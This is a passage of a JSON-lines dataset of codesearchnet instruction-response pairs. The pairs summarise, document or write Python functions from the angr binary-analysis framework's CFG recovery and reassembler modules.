n.final_states:\n                            continue\n                        actions = [ac for ac in n.final_states[0].history.recent_actions\n                                   # Normally it's enough to only use the first final state\n                                   if ac.bbl_addr == cl.block_addr and\n                                   ac.stmt_idx == cl.stmt_idx\n                                   ]\n                        for ac in actions:\n                            if not hasattr(ac, 'action'):\n                                continue\n                            if ac.action == 'read':\n                                if ac.type == 'mem':\n                                    unconstrained_value = base_state.solver.Unconstrained('unconstrained',\n                                                                                      ac.size.ast * 8)\n                                    base_state.memory.store(ac.addr,\n                                                            unconstrained_value,\n                                                            endness=self.project.arch.memory_endness)\n                                elif ac.type == 'reg':\n                                    unconstrained_value = base_state.solver.Unconstrained('unconstrained',\n                                                                                      ac.size.ast * 8)\n                                    base_state.registers.store(ac.offset,\n                                                               unconstrained_value,\n                                                               endness=self.project.arch.register_endness)\n\n                # Clear the constraints!\n                base_state.release_plugin('solver')\n\n            # For speed concerns, we are limiting the timeout for z3 solver to 5 seconds\n            base_state.solver._solver.timeout = 5000\n\n            sc = self.project.factory.simulation_manager(base_state)\n            sc.use_technique(Slicecutor(annotated_cfg))\n            sc.use_technique(LoopSeer(bound=1))\n            sc.run()\n\n            if sc.cut or sc.deadended:\n                all_deadended_states = sc.cut + sc.deadended\n                for s in all_deadended_states:\n                    if s.addr == sim_successors.addr:\n                        # We want to get its successors\n                        succs = s.step()\n                        for succ in succs.flat_successors:\n                            successing_addresses.add(succ.addr)\n\n            else:\n                l.debug(\"Cannot determine the exit. You need some better ways to recover the exits :-(\")\n\n        l.debug('Resolution is done, and we have %d new successors.', len(successing_addresses))\n\n        return list(successing_addresses)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _symbolically_back_traverse(self, current_block, block_artifacts, cfg_node):\n        class register_protector:\n            def __init__(self, reg_offset, info_collection):\n                \"\"\"\n                Class to overwrite registers.\n\n                :param int reg_offest:       Register offset to overwrite from.\n                :param dict info_collection: New register offsets to use (in container).\n                \"\"\"\n                self._reg_offset = reg_offset\n                self._info_collection = info_collection\n\n            def write_persistent_register(self, state_):\n                \"\"\"\n                Writes over given registers from self._info_coollection (taken from block_artifacts)\n\n                :param SimSuccessors state_: state to update registers for\n                \"\"\"\n                if state_.inspect.address is None:\n                    l.error('state.inspect.address is None. It will be fixed by Yan later.')\n                    return\n\n                if state_.registers.load(self._reg_offset).symbolic:\n                    current_run = state_.inspect.address\n                    if current_run in self._info_collection and \\\n                            not state_.solver.symbolic(self._info_collection[current_run][self._reg_offset]):\n                        l.debug(\"Overwriting %s with %s\", state_.registers.load(self._reg_offset),\n                                self._info_collection[current_run][self._reg_offset])\n                        state_.registers.store(\n                            self._reg_offset,\n                            self._info_collection[current_run][self._reg_offset]\n                        )\n\n        l.debug(\"Start back traversal from %s\", current_block)\n\n        # Create a partial CFG first\n        temp_cfg = networkx.DiGraph(self.graph)\n        # Reverse it\n        temp_cfg.reverse(copy=False)\n\n        path_length = 0\n        concrete_exits = []\n        if cfg_node not in temp_cfg.nodes():\n            # TODO: Figure out why this is happening\n            return concrete_exits\n\n        keep_running = True\n        while not concrete_exits and path_length < 5 and keep_running:\n            path_length += 1\n            queue = [cfg_node]\n            avoid = set()\n            for _ in range(path_length):\n                new_queue = []\n                for n in queue:\n                    successors = list(temp_cfg.successors(n))\n                    for suc in successors:\n                        jk = temp_cfg.get_edge_data(n, suc)['jumpkind']\n                        if jk != 'Ijk_Ret':\n                            # We don't want to trace into libraries\n                            predecessors = list(temp_cfg.predecessors(suc))\n                            avoid |= {p.addr for p in predecessors if p is not n}\n                            new_queue.append(suc)\n                queue = new_queue\n\n            if path_length <= 1:\n                continue\n\n            for n in queue:\n                # Start symbolic exploration from each block\n                state = self.project.factory.blank_state(addr=n.addr,\n                                                         mode='symbolic',\n                                                         add_options={\n                                                                         o.DO_RET_EMULATION,\n                                                                         o.CONSERVATIVE_READ_STRATEGY,\n                                                                     } | o.resilience\n                                                         )\n                # Avoid concretization of any symbolic read address that is over a certain limit\n                # TODO: test case is needed for this option\n\n                # Set initial values of persistent regs\n                if n.addr in block_artifacts:\n                    for reg in state.arch.persistent_regs:\n                        state.registers.store(reg, block_artifacts[n.addr][reg])\n                for reg in state.arch.persistent_regs:\n                    reg_protector = register_protector(reg, block_artifacts)\n                    state.inspect.add_breakpoint('reg_write',\n                                                 BP(\n                                                     BP_AFTER,\n                                                     reg_write_offset=state.arch.registers[reg][0],\n                                                     action=reg_protector.write_persistent_register\n                                                 )\n                                                 )\n                simgr = self.project.factory.simulation_manager(state)\n                simgr.use_technique(LoopSeer(bound=10))\n                simgr.use_technique(Explorer(find=current_block.addr, avoid=avoid))\n                simgr.use_technique(LengthLimiter(path_length))\n                simgr.run()\n\n                if simgr.found:\n                    simgr = self.project.factory.simulation_manager(simgr.one_found, save_unsat=True)\n                    simgr.step()\n                    if simgr.active or simgr.unsat:\n                        keep_running = False\n                        concrete_exits.extend(simgr.active)\n                        concrete_exits.extend(simgr.unsat)\n                if keep_running:\n                    l.debug('Step back for one more run...')\n\n        # Make sure these successors are actually concrete\n        # We just use the ip, persistent registers, and jumpkind to initialize the original unsat state\n        # TODO: It works for jumptables, but not for calls. We should also handle changes in sp\n        new_concrete_successors = []\n        for c in concrete_exits:\n            unsat_state = current_block.unsat_successors[0].copy()\n            unsat_state.history.jumpkind = c.history.jumpkind\n            for reg in unsat_state.arch.persistent_regs + ['ip']:\n                unsat_state.registers.store(reg, c.registers.load(reg))\n            new_concrete_successors.append(unsat_state)\n\n        return new_concrete_successors", "response": "This method is used to find the path of the execution of the given CFGNode in the given block."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_symbolic_function_initial_state(self, function_addr, fastpath_mode_state=None):\n        if function_addr is None:\n            return None\n\n        if function_addr in self._symbolic_function_initial_state:\n            return self._symbolic_function_initial_state[function_addr]\n\n        if fastpath_mode_state is not None:\n            fastpath_state = fastpath_mode_state\n        else:\n            if function_addr in self._function_input_states:\n                fastpath_state = self._function_input_states[function_addr]\n            else:\n                raise AngrCFGError('The impossible happened. Please report to Fish.')\n\n        symbolic_initial_state = self.project.factory.entry_state(mode='symbolic')\n        if fastpath_state is not None:\n            symbolic_initial_state = self.project.simos.prepare_call_state(fastpath_state,\n                                                                            initial_state=symbolic_initial_state)\n\n        # Find number of instructions of start block\n        func = self.project.kb.functions.get(function_addr)\n        start_block = func._get_block(function_addr)\n        num_instr = start_block.instructions - 1\n\n        symbolic_initial_state.ip = function_addr\n        path = self.project.factory.path(symbolic_initial_state)\n        try:\n            sim_successors = self.project.factory.successors(path.state, num_inst=num_instr)\n        except (SimError, AngrError):\n            return None\n\n        # We execute all but the last instruction in this basic block, so we have a cleaner\n        # state\n        # Start execution!\n        exits = sim_successors.flat_successors + sim_successors.unsat_successors\n\n        if exits:\n            final_st = None\n            for ex in exits:\n                if ex.satisfiable():\n                    final_st = ex\n                    break\n        else:\n            final_st = None\n\n        self._symbolic_function_initial_state[function_addr] = final_st\n\n        return final_st", "response": "This method returns a symbolic state for the specified function."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsearch for function hints that might be used as exit targets later and adds them into pending_exits.", "response": "def _search_for_function_hints(self, successor_state):\n        \"\"\"\n        Scan for constants that might be used as exit targets later, and add them into pending_exits.\n\n        :param SimState successor_state: A successing state.\n        :return:                                 A list of discovered code addresses.\n        :rtype:                                  list\n        \"\"\"\n\n        function_hints = []\n\n        for action in successor_state.history.recent_actions:\n            if action.type == 'reg' and action.offset == self.project.arch.ip_offset:\n                # Skip all accesses to IP registers\n                continue\n            elif action.type == 'exit':\n                # only consider read/write actions\n                continue\n\n            # Enumerate actions\n            if isinstance(action, SimActionData):\n                data = action.data\n                if data is not None:\n                    # TODO: Check if there is a proper way to tell whether this const falls in the range of code\n                    # TODO: segments\n                    # Now let's live with this big hack...\n                    try:\n                        const = successor_state.solver.eval_one(data.ast)\n                    except:  # pylint: disable=bare-except\n                        continue\n\n                    if self._is_address_executable(const):\n                        if self._pending_function_hints is not None and const in self._pending_function_hints:\n                            continue\n\n                        # target = const\n                        # tpl = (None, None, target)\n                        # st = self.project._simos.prepare_call_state(self.project.initial_state(mode='fastpath'),\n                        #                                           initial_state=saved_state)\n                        # st = self.project.initial_state(mode='fastpath')\n                        # exits[tpl] = (st, None, None)\n\n                        function_hints.append(const)\n\n        l.debug('Got %d possible exits, including: %s', len(function_hints),\n               \", \".join([\"0x%x\" % f for f in function_hints])\n               )\n\n        return function_hints"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a SimSuccessors instance for a block.", "response": "def _get_simsuccessors(self, addr, job, current_function_addr=None):\n        \"\"\"\n        Create the SimSuccessors instance for a block.\n\n        :param int addr:                  Address of the block.\n        :param CFGJob job:                The CFG job instance with an input state inside.\n        :param int current_function_addr: Address of the current function.\n        :return:                          A SimSuccessors instance\n        :rtype:                           SimSuccessors\n        \"\"\"\n\n        exception_info = None\n        state = job.state\n        saved_state = job.state  # We don't have to make a copy here\n\n        # respect the basic block size from base graph\n        block_size = None\n        if self._base_graph is not None:\n            for n in self._base_graph.nodes():\n                if n.addr == addr:\n                    block_size = n.size\n                    break\n\n        try:\n            sim_successors = None\n\n            if not self._keep_state:\n                if self.project.is_hooked(addr):\n                    old_proc = self.project._sim_procedures[addr]\n                    is_continuation = old_proc.is_continuation\n                elif self.project.simos.is_syscall_addr(addr):\n                    old_proc = self.project.simos.syscall_from_addr(addr)\n                    is_continuation = False  # syscalls don't support continuation\n                else:\n                    old_proc = None\n                    is_continuation = None\n\n                if old_proc is not None and \\\n                        not is_continuation and \\\n                        not old_proc.ADDS_EXITS and \\\n                        not old_proc.NO_RET:\n                    # DON'T CREATE USELESS SIMPROCEDURES if we don't care about the accuracy of states\n                    # When generating CFG, a SimProcedure will not be created as it is but be created as a\n                    # ReturnUnconstrained stub if it satisfies the following conditions:\n                    # - It doesn't add any new exits.\n                    # - It returns as normal.\n                    # In this way, we can speed up the CFG generation by quite a lot as we avoid simulating\n                    # those functions like read() and puts(), which has no impact on the overall control flow at all.\n                    #\n                    # Special notes about SimProcedure continuation: Any SimProcedure instance that is a continuation\n                    # will add new exits, otherwise the original SimProcedure wouldn't have been executed anyway. Hence\n                    # it's reasonable for us to always simulate a SimProcedure with continuation.\n\n                    old_name = None\n\n                    if old_proc.is_syscall:\n                        new_stub = SIM_PROCEDURES[\"stubs\"][\"syscall\"]\n                        ret_to = state.regs.ip_at_syscall\n                    else:\n                        # normal SimProcedures\n                        new_stub = SIM_PROCEDURES[\"stubs\"][\"ReturnUnconstrained\"]\n                        ret_to = None\n\n                    old_name = old_proc.display_name\n\n                    # instantiate the stub\n                    new_stub_inst = new_stub(display_name=old_name)\n\n                    sim_successors = self.project.engines.procedure_engine.process(\n                        state,\n                        new_stub_inst,\n                        force_addr=addr,\n                        ret_to=ret_to,\n                    )\n\n            if sim_successors is None:\n                jumpkind = state.history.jumpkind\n                jumpkind = 'Ijk_Boring' if jumpkind is None else jumpkind\n                sim_successors = self.project.factory.successors(\n                        state,\n                        jumpkind=jumpkind,\n                        size=block_size,\n                        opt_level=self._iropt_level)\n\n        except (SimFastPathError, SimSolverModeError) as ex:\n\n            if saved_state.mode == 'fastpath':\n                # Got a SimFastPathError or SimSolverModeError in FastPath mode.\n                # We wanna switch to symbolic mode for current IRSB.\n                l.debug('Switch to symbolic mode for address %#x', addr)\n                # Make a copy of the current 'fastpath' state\n\n                l.debug('Symbolic jumps at basic block %#x.', addr)\n\n                new_state = None\n                if addr != current_function_addr:\n                    new_state = self._get_symbolic_function_initial_state(current_function_addr)\n\n                if new_state is None:\n                    new_state = state.copy()\n                    new_state.set_mode('symbolic')\n                new_state.options.add(o.DO_RET_EMULATION)\n                # Remove bad constraints\n                # FIXME: This is so hackish...\n                new_state.solver._solver.constraints = [c for c in new_state.solver.constraints if\n                                                    c.op != 'BoolV' or c.args[0] is not False]\n                new_state.solver._solver._result = None\n                # Swap them\n                saved_state, job.state = job.state, new_state\n                sim_successors, exception_info, _ = self._get_simsuccessors(addr, job)\n\n            else:\n                exception_info = sys.exc_info()\n                # Got a SimSolverModeError in symbolic mode. We are screwed.\n                # Skip this IRSB\n                l.debug(\"Caught a SimIRSBError %s. Don't panic, this is usually expected.\", ex)\n                inst = SIM_PROCEDURES[\"stubs\"][\"PathTerminator\"]()\n                sim_successors = SimEngineProcedure().process(state, inst)\n\n        except SimIRSBError:\n            exception_info = sys.exc_info()\n            # It's a tragedy that we came across some instructions that VEX\n            # does not support. I'll create a terminating stub there\n            l.debug(\"Caught a SimIRSBError during CFG recovery. Creating a PathTerminator.\", exc_info=True)\n            inst = SIM_PROCEDURES[\"stubs\"][\"PathTerminator\"]()\n            sim_successors = SimEngineProcedure().process(state, inst)\n\n        except claripy.ClaripyError:\n            exception_info = sys.exc_info()\n            l.debug(\"Caught a ClaripyError during CFG recovery. Don't panic, this is usually expected.\", exc_info=True)\n            # Generate a PathTerminator to terminate the current path\n            inst = SIM_PROCEDURES[\"stubs\"][\"PathTerminator\"]()\n            sim_successors = SimEngineProcedure().process(state, inst)\n\n        except SimError:\n            exception_info = sys.exc_info()\n            l.debug(\"Caught a SimError during CFG recovery. Don't panic, this is usually expected.\", exc_info=True)\n            # Generate a PathTerminator to terminate the current path\n            inst = SIM_PROCEDURES[\"stubs\"][\"PathTerminator\"]()\n            sim_successors = SimEngineProcedure().process(state, inst)\n\n        except AngrExitError as ex:\n            exception_info = sys.exc_info()\n            l.debug(\"Caught a AngrExitError during CFG recovery. Don't panic, this is usually expected.\", exc_info=True)\n            # Generate a PathTerminator to terminate the current path\n            inst = SIM_PROCEDURES[\"stubs\"][\"PathTerminator\"]()\n            sim_successors = SimEngineProcedure().process(state, inst)\n\n        except AngrError:\n            exception_info = sys.exc_info()\n            section = self.project.loader.main_object.find_section_containing(addr)\n            if section is None:\n                sec_name = 'No section'\n            else:\n                sec_name = section.name\n            # AngrError shouldn't really happen though\n            l.debug(\"Caught an AngrError during CFG recovery at %#x (%s)\",\n                    addr, sec_name, exc_info=True)\n            # We might be on a wrong branch, and is likely to encounter the\n            # \"No bytes in memory xxx\" exception\n            # Just ignore it\n            sim_successors = None\n\n        return sim_successors, exception_info, saved_state"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _create_new_call_stack(self, addr, all_jobs, job, exit_target, jumpkind):\n\n        if self._is_call_jumpkind(jumpkind):\n            new_call_stack = job.call_stack_copy()\n            # Notice that in ARM, there are some freaking instructions\n            # like\n            # BLEQ <address>\n            # It should give us three exits: Ijk_Call, Ijk_Boring, and\n            # Ijk_Ret. The last exit is simulated.\n            # Notice: We assume the last exit is the simulated one\n            if len(all_jobs) > 1 and all_jobs[-1].history.jumpkind == \"Ijk_FakeRet\":\n                se = all_jobs[-1].solver\n                retn_target_addr = se.eval_one(all_jobs[-1].ip, default=0)\n                sp = se.eval_one(all_jobs[-1].regs.sp, default=0)\n\n                new_call_stack = new_call_stack.call(addr, exit_target,\n                                    retn_target=retn_target_addr,\n                                    stack_pointer=sp)\n\n            elif jumpkind.startswith('Ijk_Sys') and len(all_jobs) == 1:\n                # This is a syscall. It returns to the same address as itself (with a different jumpkind)\n                retn_target_addr = exit_target\n                se = all_jobs[0].solver\n                sp = se.eval_one(all_jobs[0].regs.sp, default=0)\n                new_call_stack = new_call_stack.call(addr, exit_target,\n                                    retn_target=retn_target_addr,\n                                    stack_pointer=sp)\n\n            else:\n                # We don't have a fake return exit available, which means\n                # this call doesn't return.\n                new_call_stack = CallStack()\n                se = all_jobs[-1].solver\n                sp = se.eval_one(all_jobs[-1].regs.sp, default=0)\n\n                new_call_stack = new_call_stack.call(addr, exit_target, retn_target=None, stack_pointer=sp)\n\n        elif jumpkind == \"Ijk_Ret\":\n            # Normal return\n            new_call_stack = job.call_stack_copy()\n            try:\n                new_call_stack = new_call_stack.ret(exit_target)\n            except SimEmptyCallStackError:\n                pass\n\n            se = all_jobs[-1].solver\n            sp = se.eval_one(all_jobs[-1].regs.sp, default=0)\n            old_sp = job.current_stack_pointer\n\n            # Calculate the delta of stack pointer\n            if sp is not None and old_sp is not None:\n                delta = sp - old_sp\n                func_addr = job.func_addr\n\n                if self.kb.functions.function(func_addr) is None:\n                    # Create the function if it doesn't exist\n                    # FIXME: But hell, why doesn't it exist in the first place?\n                    l.error(\"Function 0x%x doesn't exist in function manager although it should be there.\"\n                            \"Look into this issue later.\",\n                            func_addr)\n                    self.kb.functions.function(func_addr, create=True)\n\n                # Set sp_delta of the function\n                self.kb.functions.function(func_addr, create=True).sp_delta = delta\n\n        elif jumpkind == 'Ijk_FakeRet':\n            # The fake return...\n            new_call_stack = job.call_stack\n\n        else:\n            # although the jumpkind is not Ijk_Call, it may still jump to a new function... let's see\n            if self.project.is_hooked(exit_target):\n                hooker = self.project.hooked_by(exit_target)\n                if not hooker is procedures.stubs.UserHook.UserHook:\n                    # if it's not a UserHook, it must be a function\n                    # Update the function address of the most recent call stack frame\n                    new_call_stack = job.call_stack_copy()\n                    new_call_stack.current_function_address = exit_target\n\n                else:\n                    # TODO: We need a way to mark if a user hook is a function or not\n                    # TODO: We can add a map in Project to store this information\n                    # For now we are just assuming they are not functions, which is mostly the case\n                    new_call_stack = job.call_stack\n\n            else:\n                # Normal control flow transition\n                new_call_stack = job.call_stack\n\n        return new_call_stack", "response": "Creates a new call stack for the given target block."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a CFGNode instance for a specific block.", "response": "def _create_cfgnode(self, sim_successors, call_stack, func_addr, block_id=None, depth=None, exception_info=None):\n        \"\"\"\n        Create a context-sensitive CFGNode instance for a specific block.\n\n        :param SimSuccessors sim_successors:         The SimSuccessors object.\n        :param CallStack call_stack_suffix:          The call stack.\n        :param int func_addr:                        Address of the current function.\n        :param BlockID block_id:                     The block ID of this CFGNode.\n        :param int or None depth:                    Depth of this CFGNode.\n        :return:                                     A CFGNode instance.\n        :rtype:                                      CFGNode\n        \"\"\"\n\n        sa = sim_successors.artifacts  # shorthand\n\n        # Determine if this is a SimProcedure, and further, if this is a syscall\n        syscall = None\n        is_syscall = False\n        if sim_successors.sort == 'SimProcedure':\n            is_simprocedure = True\n            if sa['is_syscall'] is True:\n                is_syscall = True\n                syscall = sim_successors.artifacts['procedure']\n        else:\n            is_simprocedure = False\n\n        if is_simprocedure:\n            simproc_name = sa['name'].split('.')[-1]\n            if simproc_name == \"ReturnUnconstrained\" and sa['resolves'] is not None:\n                simproc_name = sa['resolves']\n\n            no_ret = False\n            if syscall is not None and sa['no_ret']:\n                no_ret = True\n\n            cfg_node = CFGENode(sim_successors.addr,\n                                None,\n                                self.model,\n                                callstack_key=call_stack.stack_suffix(self.context_sensitivity_level),\n                                input_state=None,\n                                simprocedure_name=simproc_name,\n                                syscall_name=syscall,\n                                no_ret=no_ret,\n                                is_syscall=is_syscall,\n                                function_address=sim_successors.addr,\n                                block_id=block_id,\n                                depth=depth,\n                                creation_failure_info=exception_info,\n                                thumb=(isinstance(self.project.arch, ArchARM) and sim_successors.addr & 1),\n                                )\n\n        else:\n            cfg_node = CFGENode(sim_successors.addr,\n                                sa['irsb_size'],\n                                self.model,\n                                callstack_key=call_stack.stack_suffix(self.context_sensitivity_level),\n                                input_state=None,\n                                is_syscall=is_syscall,\n                                function_address=func_addr,\n                                block_id=block_id,\n                                depth=depth,\n                                irsb=sim_successors.artifacts['irsb'],\n                                creation_failure_info=exception_info,\n                                thumb=(isinstance(self.project.arch, ArchARM) and sim_successors.addr & 1),\n                                )\n\n        return cfg_node"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _detect_loops(self, loop_callback=None):\n\n        loop_finder = self.project.analyses.LoopFinder(kb=self.kb, normalize=False, fail_fast=self._fail_fast)\n\n        if loop_callback is not None:\n            graph_copy = networkx.DiGraph(self._graph)\n\n            for loop in loop_finder.loops:  # type: angr.analyses.loopfinder.Loop\n                loop_callback(graph_copy, loop)\n\n            self.model.graph = graph_copy\n\n        # Update loop backedges and graph\n        self._loop_back_edges = list(itertools.chain.from_iterable(loop.continue_edges for loop in loop_finder.loops))", "response": "Detect loops in the current model."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _immediate_dominators(self, node, target_graph=None, reverse_graph=False):\n        if target_graph is None:\n            target_graph = self.graph\n\n        if node not in target_graph:\n            raise AngrCFGError('Target node %s is not in graph.' % node)\n\n        graph = networkx.DiGraph(target_graph)\n        if reverse_graph:\n            # Reverse the graph without deepcopy\n            for n in target_graph.nodes():\n                graph.add_node(n)\n            for src, dst in target_graph.edges():\n                graph.add_edge(dst, src)\n\n        idom = {node: node}\n\n        order = list(networkx.dfs_postorder_nodes(graph, node))\n        dfn = {u: i for i, u in enumerate(order)}\n        order.pop()\n        order.reverse()\n\n        def intersect(u_, v_):\n            \"\"\"\n            Finds the highest (in postorder valuing) point of intersection above two node arguments.\n\n            :param str u_: nx node id.\n            :param str v_: nx node id.\n            :return: intersection of paths.\n            :rtype: str\n            \"\"\"\n            while u_ != v_:\n                while dfn[u_] < dfn[v_]:\n                    u_ = idom[u_]\n                while dfn[u_] > dfn[v_]:\n                    v_ = idom[v_]\n            return u_\n\n        changed = True\n        while changed:\n            changed = False\n            for u in order:\n                new_idom = reduce(intersect, (v for v in graph.pred[u] if v in idom))\n                if u not in idom or idom[u] != new_idom:\n                    idom[u] = new_idom\n                    changed = True\n\n        return idom", "response": "Get all immediate dominators of a given node upwards."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _is_indirect_jump(_, sim_successors):\n\n        if sim_successors.artifacts['irsb_direct_next']:\n            # It's a direct jump\n            return False\n\n        default_jumpkind = sim_successors.artifacts['irsb_default_jumpkind']\n        if default_jumpkind not in ('Ijk_Call', 'Ijk_Boring', 'Ijk_InvalICache'):\n            # It's something else, like a ret of a syscall... we don't care about it\n            return False\n\n        return True", "response": "Determine if this SimIRSB has an indirect jump as its exit\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nchecks if the specific address is in one of the executable ranges.", "response": "def _is_address_executable(self, address):\n        \"\"\"\n        Check if the specific address is in one of the executable ranges.\n\n        :param int address: The address\n        :return: True if it's in an executable range, False otherwise\n        \"\"\"\n\n        for r in self._executable_address_ranges:\n            if r[0] <= address < r[1]:\n                return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _get_callsites(self, function_address):\n\n        all_predecessors = []\n\n        nodes = self.get_all_nodes(function_address)\n        for n in nodes:\n            predecessors = list(self.get_predecessors(n))\n            all_predecessors.extend(predecessors)\n\n        return all_predecessors", "response": "Get the callsites of a specific function."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_nx_paths(self, begin, end):\n        if isinstance(begin, int) and isinstance(end, int):\n            n_begin = self.get_any_node(begin)\n            n_end = self.get_any_node(end)\n\n        elif isinstance(begin, CFGENode) and isinstance(end, CFGENode):\n            n_begin = begin\n            n_end = end\n        else:\n            raise AngrCFGError(\"from and to should be of the same type\")\n\n        self.remove_fakerets()\n        return networkx.all_shortest_paths(self.graph, n_begin, n_end)", "response": "Get the possible simple paths between two addresses or node instances."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _quasi_topological_sort(self):\n\n        # Clear the existing sorting result\n        self._quasi_topological_order = {}\n\n        ctr = self._graph.number_of_nodes()\n\n        for ep in self._entry_points:\n            # FIXME: This is not always correct. We'd better store CFGNodes in self._entry_points\n            ep_node = self.get_any_node(ep)\n\n            if not ep_node:\n                continue\n\n            for n in networkx.dfs_postorder_nodes(self._graph, source=ep_node):\n                if n not in self._quasi_topological_order:\n                    self._quasi_topological_order[n] = ctr\n                    ctr -= 1", "response": "Perform a quasi - topological sort on an already constructed CFG graph."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _reset_state_mode(self, state, mode):\n\n        state.set_mode(mode)\n        state.options |= self._state_add_options\n        state.options = state.options.difference(self._state_remove_options)", "response": "Reset the state mode to the given mode and apply the custom state options specified with this analysis."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmark a certain label as assigned.", "response": "def label_got(self, addr, label):\n        \"\"\"\n        Mark a certain label as assigned (to an instruction or a block of data).\n\n        :param int addr: The address of the label.\n        :param angr.analyses.reassembler.Label label:\n                         The label that is just assigned.\n        :return: None\n        \"\"\"\n\n        if label in self.addr_to_label[addr]:\n            label.assigned = True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _imm_to_ptr(self, imm, operand_type, mnemonic):  # pylint:disable=no-self-use,unused-argument\n\n        is_coderef, is_dataref = False, False\n        baseaddr = None\n\n        if not is_coderef and not is_dataref:\n            if self.binary.main_executable_regions_contain(imm):\n                # does it point to the beginning of an instruction?\n                if imm in self.binary.all_insn_addrs:\n                    is_coderef = True\n                    baseaddr = imm\n\n        if not is_coderef and not is_dataref:\n            if self.binary.main_nonexecutable_regions_contain(imm):\n                is_dataref = True\n                baseaddr = imm\n\n        if not is_coderef and not is_dataref:\n            tolerance_before = 1024 if operand_type == OP_TYPE_MEM else 64\n            contains_, baseaddr_ = self.binary.main_nonexecutable_region_limbos_contain(imm,\n                                                                                        tolerance_before=tolerance_before,\n                                                                                        tolerance_after=1024\n                                                                                        )\n            if contains_:\n                is_dataref = True\n                baseaddr = baseaddr_\n\n            if not contains_:\n                contains_, baseaddr_ = self.binary.main_executable_region_limbos_contain(imm)\n                if contains_:\n                    is_coderef = True\n                    baseaddr = baseaddr_\n\n        return (is_coderef, is_dataref, baseaddr)", "response": "Classifies an immediate as a pointer."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting the function name from the labels of the very first block.", "response": "def name(self):\n        \"\"\"\n        Get function name from the labels of the very first block.\n        :return: Function name if there is any, None otherwise\n        :rtype: string\n        \"\"\"\n\n        if self._name is not None:\n            return self._name\n\n        if not self.blocks:\n            return None\n\n        if not self.blocks[0].instructions:\n            return None\n\n        if not self.blocks[0].instructions[0].labels:\n            return None\n\n        lbl = self.blocks[0].instructions[0].labels[0]\n\n        if isinstance(lbl, FunctionLabel):\n            return lbl.function_name\n\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns True if this function is a PLT entry False otherwise.", "response": "def is_plt(self):\n        \"\"\"\n        If this function is a PLT entry or not.\n        :return: True if this function is a PLT entry, False otherwise\n        :rtype: bool\n        \"\"\"\n\n        if self.section == \".plt\":\n            return True\n\n        if not self.blocks:\n            return False\n\n        initial_block = next((b for b in self.blocks if b.addr == self.addr), None)\n        if initial_block is None:\n            return False\n\n        if not initial_block.instructions:\n            return False\n\n        if not initial_block.instructions[0].labels:\n            return False\n\n        lbl = initial_block.instructions[0].labels[0]\n\n        if isinstance(lbl, FunctionLabel):\n            return lbl.plt\n\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the assembly manifest of the procedure.", "response": "def assembly(self, comments=False, symbolized=True):\n        \"\"\"\n        Get the assembly manifest of the procedure.\n\n        :param comments:\n        :param symbolized:\n        :return: A list of tuples (address, basic block assembly), ordered by basic block addresses\n        :rtype: list\n        \"\"\"\n\n        assembly = [ ]\n\n        header = \"\\t.section\\t{section}\\n\\t.align\\t{alignment}\\n\".format(section=self.section,\n                                                 alignment=self.binary.section_alignment(self.section)\n                                                 )\n        if self.addr is not None:\n            procedure_name = \"%#x\" % self.addr\n        else:\n            procedure_name = self._name\n        header += \"\\t#Procedure %s\\n\" % procedure_name\n\n        if self._output_function_label:\n            if self.addr:\n                function_label = self.binary.symbol_manager.new_label(self.addr)\n            else:\n                function_label = self.binary.symbol_manager.new_label(None, name=procedure_name, is_function=True)\n            header += str(function_label) + \"\\n\"\n\n        assembly.append((self.addr, header))\n\n        if self.asm_code:\n            s = self.asm_code\n            assembly.append((self.addr, s))\n        elif self.blocks:\n            for b in sorted(self.blocks, key=lambda x:x.addr):  # type: BasicBlock\n                s = b.assembly(comments=comments, symbolized=symbolized)\n                assembly.append((b.addr, s))\n\n        return assembly"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets all instruction addresses in the binary.", "response": "def instruction_addresses(self):\n        \"\"\"\n        Get all instruction addresses in the binary.\n\n        :return: A list of sorted instruction addresses.\n        :rtype: list\n        \"\"\"\n\n        addrs = [ ]\n        for b in sorted(self.blocks, key=lambda x: x.addr):  # type: BasicBlock\n            addrs.extend(b.instruction_addresses())\n\n        return sorted(set(addrs), key=lambda x: x[0])"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ndetermining if we should output the function label in assembly.", "response": "def _output_function_label(self):\n        \"\"\"\n        Determines if we want to output the function label in assembly. We output the function label only when the\n        original instruction does not output the function label.\n\n        :return: True if we should output the function label, False otherwise.\n        :rtype: bool\n        \"\"\"\n\n        if self.asm_code:\n            return True\n        if not self.blocks:\n            return True\n\n        the_block = next((b for b in self.blocks if b.addr == self.addr), None)\n        if the_block is None:\n            return True\n        if not the_block.instructions:\n            return True\n        if not the_block.instructions[0].labels:\n            return True\n        return False"}
